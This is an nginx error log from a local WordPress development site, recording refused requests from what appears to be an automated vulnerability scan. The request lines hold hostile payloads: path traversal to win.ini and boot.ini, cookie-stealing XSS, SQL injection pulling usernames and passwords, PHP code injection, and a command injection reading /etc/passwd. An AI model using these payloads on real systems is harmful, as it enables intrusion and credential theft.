2021/11/20 22:20:17 [error] 10380#22912: *4274 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/upgrade/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/upgrade/ HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 22:20:18 [error] 10380#22912: *4277 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/uploads/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/ HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 22:20:18 [error] 10380#22912: *4282 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-includes/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-includes/ HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:21:05 [error] 10380#22912: *4991 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:21:06 [error] 10380#22912: *5000 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:21:09 [error] 10380#22912: *5051 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/app.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:22:19 [error] 10380#22912: *5248 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/editor.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:22:36 [error] 10380#22912: *5610 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/login.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:22:49 [error] 10380#22912: *5703 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/source/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:23:45 [error] 10380#22912: *6063 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/adminer.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:23:47 [error] 10380#22912: *6146 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/news/admin/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:23:48 [error] 10380#22912: *6175 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/content.php?get_action=display_doc&doc_file=CREDITS HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:23:50 [error] 10380#22912: *6242 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/ang/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:23:57 [error] 10380#22912: *6489 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/base/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:23:58 [error] 10380#22912: *6526 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/artmedic_links5/index.php?id=index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:02 [error] 10380#22912: *6667 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:04 [error] 10380#22912: *6734 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:04 [error] 10380#22912: *6735 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/blogs/admin.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:04 [error] 10380#22912: *6736 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/evoadm.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:04 [error] 10380#22912: *6737 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/basilix.php?is_ssl=1 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:04 [error] 10380#22912: *6762 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin/index.php?login HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:06 [error] 10380#22912: *6859 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/wiki/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:06 [error] 10380#22912: *6860 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/users/login.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:08 [error] 10380#22912: *6907 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/blob.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:12 [error] 10380#22912: *7044 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin/login.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:15 [error] 10380#22912: *7175 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/status.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:17 [error] 10380#22912: *7254 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/about.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:18 [error] 10380#22912: *7271 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/cvs.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:18 [error] 10380#22912: *7292 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin_area/login.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:22 [error] 10380#22912: *7405 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?page=start HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:22 [error] 10380#22912: *7424 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/upgrade/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/upgrade/?Mode=debug HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:23 [error] 10380#22912: *7459 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/uploads/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/?Mode=debug HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:24 [error] 10380#22912: *7498 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-includes/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-includes/?Mode=debug HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:27 [error] 10380#22912: *7631 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/LightNEasy.php?do=login HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:30 [error] 10380#22912: *7742 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/titleBar.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:34 [error] 10380#22912: *7927 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/feed.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:34 [error] 10380#22912: *7930 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/doku.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:35 [error] 10380#22912: *7955 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/upgrade/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/upgrade/?page=login&action=about HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:35 [error] 10380#22912: *7956 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/uploads/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/?page=login&action=about HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/20 23:24:35 [error] 10380#22912: *7957 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-includes/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-includes/?page=login&action=about HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:18 [error] 10380#22912: *21849 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/passwiki.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:19 [error] 10380#22912: *21892 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/kommentar.php?filecat="><script>alert(/xss-test/)</script>&fileid=0 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:20 [error] 10380#22912: *21903 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/passwiki.php?site_id=../../../../../../../../../../../../../windows/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:20 [error] 10380#22912: *21904 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/passwiki.php?site_id=../../../../../../../../../../../../../boot.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:20 [error] 10380#22912: *21906 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/passwiki.php?site_id=../../../../../../../../../../../../../winnt/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:20 [error] 10380#22912: *21928 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/adframe.php?refresh=example.com'<script>alert(document.cookie)</script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:21 [error] 10380#22912: *21971 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/main.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:22 [error] 10380#22912: *21988 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/viewfaqs.php?cat=-1+union+select+1 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:22 [error] 10380#22912: *22011 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/bible.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:22 [error] 10380#22912: *22022 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin/admin.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:22 [error] 10380#22912: *22025 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin/admin.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:23 [error] 10380#22912: *22046 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/details_view.php?event_id=1&date=2000-12-01&view=month&loc=loc1&page_info_message=<script>alert(/xss-test/)</script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:24 [error] 10380#22912: *22105 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/wizard/index.php?type=';phpinfo();// HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:24 [error] 10380#22912: *22116 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/wizard/url.php?${phpinfo()}=1 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:24 [error] 10380#22912: *22125 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/firstvisit.php?lang_global=../../../../../../../../../windows/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:24 [error] 10380#22912: *22126 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/firstvisit.php?lang_global=../../../../../../../../../boot.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:24 [error] 10380#22912: *22127 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/firstvisit.php?lang_global=../../../../../../../../../winnt/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:25 [error] 10380#22912: *22152 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?n=guest&c=0&m=search&s=forum&wert=-1%25%22%20UNION%20ALL%20SELECT%201,2,3,4,CONCAT(nick,%200x3a,%20pwd),6%20FROM%20com_users%23 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:26 [error] 10380#22912: *22201 access forbidden by rule, client: 127.0.0.1, server: , request: "POST /wp-content/uploads/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:26 [error] 10380#22912: *22204 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/themes/default/header.inc.php?theme_dir=%22%3E%3Cscript%3Ealert%28/openvasvt/%29;%3C/script%3E HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:26 [error] 10380#22912: *22209 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/module.php?mod=<script>alert(8154711)</script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:26 [error] 10380#22912: *22212 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/docbuilder/top.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:29 [error] 10380#22912: *22329 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?page=../../../../../../../../../../../../../../../../windows/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:29 [error] 10380#22912: *22330 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?page=../../../../../../../../../../../../../../../../boot.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:29 [error] 10380#22912: *22333 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?page=../../../../../../../../../../../../../../../../winnt/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:29 [error] 10380#22912: *22340 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/moadmin.php?db=admin&action=listRows&collection=fdsa&find=array();phpinfo(); HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:29 [error] 10380#22912: *22341 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/wu-moadmin.php?db=admin&action=listRows&collection=fdsa&find=array();phpinfo(); HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:30 [error] 10380#22912: *22390 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/pages.php?id=-999999+union+select+0x53514c2d496e6a656374696f6e2d54657374,2,3-- HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:31 [error] 10380#22912: *22461 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?m=recipes&a=search&search=yes&base_id=5+union+all+select+1,2,+0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7+from+security_users-- HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:32 [error] 10380#22912: *22496 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?error=<script>foo</script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:33 [error] 10380#22912: *22527 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/admin/admin.php?sid=0' HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:35 [error] 10380#22912: *22618 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=../../../../../../../../../../../../../windows/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:35 [error] 10380#22912: *22621 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=../../../../../../../../../../../../../boot.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:35 [error] 10380#22912: *22622 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=../../../../../../../../../../../../../winnt/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:36 [error] 10380#22912: *22675 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/medialist.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:37 [error] 10380#22912: *22718 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/search.php?query=we+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&topic=0&limit=30 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:37 [error] 10380#22912: *22721 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/mod.php?mod=publisher&op=allmedia&artid=-1%20union%20select%200x53514c2d496e6a656374696f6e2d54657374 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:38 [error] 10380#22912: *22798 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/forum.php?forum=-1%20UNION%20SELECT%20null%2c123456%2cnull%2cnull%2cnull%2cnull%2f* HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:40 [error] 10380#22912: *22847 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/core/editor.php?editor_insert_bottom=/windows/win.ini HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:40 [error] 10380#22912: *22848 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/core/editor.php?editor_insert_bottom=/boot.ini HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:40 [error] 10380#22912: *22849 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/core/editor.php?editor_insert_bottom=/winnt/win.ini HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:40 [error] 10380#22912: *22868 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?s=blog&m=permalink&x=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:41 [error] 10380#22912: *22939 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/oldnews_reader.php?lang=../../../../../../../../../../../../../../../windows/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:41 [error] 10380#22912: *22940 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/oldnews_reader.php?lang=../../../../../../../../../../../../../../../boot.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:41 [error] 10380#22912: *22941 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/oldnews_reader.php?lang=../../../../../../../../../../../../../../../winnt/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:42 [error] 10380#22912: *22966 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/portal/login.php?message=XSS%20Catched%20!%22))%3C/script%3E%3Cscript%3Ealert(/openvasvt/)%3C/script%3E HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:43 [error] 10380#22912: *23013 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/modules.php?name=gallery&files=foobar HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:43 [error] 10380#22912: *23044 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/print.php?page=../../../../../../../../../windows/win.ini HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:43 [error] 10380#22912: *23045 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/print.php?page=../../../../../../../../../boot.ini HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:43 [error] 10380#22912: *23046 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/print.php?page=../../../../../../../../../winnt/win.ini HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:44 [error] 10380#22912: *23091 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/upgrade/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/upgrade/ HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:44 [error] 10380#22912: *23092 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-content/uploads/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/ HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:44 [error] 10380#22912: *23095 directory index of "C:/Users/ndvan/Local Sites/mywppage/app/public/wp-includes/" is forbidden, client: 127.0.0.1, server: , request: "GET /wp-includes/ HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:46 [error] 10380#22912: *23176 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?function=show_all&no=%253cscript>foo%253c/script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:46 [error] 10380#22912: *23177 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?function=add_kom&no=<script>foo</script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:46 [error] 10380#22912: *23202 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/login.php?login=<script>foo</script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:47 [error] 10380#22912: *23237 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/profil.php?id=1%20<script>foo</script> HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:49 [error] 10380#22912: *23322 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php??p=../../../../../../../../../windows/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:49 [error] 10380#22912: *23323 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php??p=../../../../../../../../../boot.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:49 [error] 10380#22912: *23324 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php??p=../../../../../../../../../winnt/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:49 [error] 10380#22912: *23360 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/src/index.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:50 [error] 10380#22912: *23370 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?act=publ&id=-3+UNION+SELECT+1,2,3,4,0x53514c2d496e6a656374696f6e2d54657374 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:50 [error] 10380#22912: *23391 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/quixplorer_2_3/index.php?action=download&dir=&item=../../../../../../../../../windows/win.ini&order=name&srt=yes HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:50 [error] 10380#22912: *23392 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/quixplorer_2_3/index.php?action=download&dir=&item=../../../../../../../../../boot.ini&order=name&srt=yes HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:50 [error] 10380#22912: *23395 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/quixplorer_2_3/index.php?action=download&dir=&item=../../../../../../../../../winnt/win.ini&order=name&srt=yes HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:51 [error] 10380#22912: *23420 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?page=../../../../../../../../../../../windows/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:51 [error] 10380#22912: *23421 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?page=../../../../../../../../../../../boot.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:51 [error] 10380#22912: *23422 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?page=../../../../../../../../../../../winnt/win.ini%00 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:51 [error] 10380#22912: *23445 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/php-ping.php?count=1+%26+cat%20/etc/passwd+%26&submit=Ping%21 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:51 [error] 10380#22912: *23462 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/research_display.php?ID=-null+UNiON+ALL+SELECT+null,null,null,0x53514c2d496e6a656374696f6e2d54657374,null,null,null HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:51 [error] 10380#22912: *23467 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/index.php?section=<script>alert(document.cookie)</script>&action=login HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:52 [error] 10380#22912: *23486 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/left.php HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:52 [error] 10380#22912: *23489 WSARecv() failed (10054: An existing connection was forcibly closed by the remote host) while reading response header from upstream, client: 127.0.0.1, server: , request: "GET /rhinos-es-3.0/admin/lib/gradient/gradient.php?tam=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini%00 HTTP/1.0", upstream: "fastcgi://127.0.0.1:10002", host: "dn-aavn-ws-001.aavn.local"
2021/11/21 00:34:54 [error] 10380#22912: *23544 access forbidden by rule, client: 127.0.0.1, server: , request: "GET /wp-content/uploads/blogAdmin/jobs.php?j=login&p=1%27or%271&%27=1 HTTP/1.0", host: "dn-aavn-ws-001.aavn.local"
